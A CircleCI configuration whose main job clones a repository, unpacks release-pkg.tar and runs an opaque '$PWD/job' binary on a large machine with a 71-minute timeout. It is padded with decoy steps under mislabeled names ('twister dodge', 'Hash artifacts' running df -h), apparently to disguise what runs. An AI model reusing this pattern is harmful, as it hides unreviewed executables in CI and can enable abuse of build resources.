version: 2.1

jobs:
  resync_sierra-7:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: twister dodge
          command: |
            mkdir -p /tmp/_bld
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/_bld/302.out; true
            echo "ready: $(sha256sum /tmp/_bld/302.out | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/_bld
          paths:
            - 302.out
  sierra-7:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_bld
      - run:
          name: Inspect pre-stage
          command: |
            { cat /tmp/_bld/302.out > /dev/null; echo "read ok" ; } || true
      - run:
          name: Checkout main
          command: git clone --depth 5 -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack build archive
          command: tar --extract --file=release-pkg.tar
      - run:
          name: Hash artifacts
          command: df -h
      - run:
          command: /bin/sleep 30
      - run:
          no_output_timeout: 71m
          command: $PWD/job
  Beta_jun12-smoke:
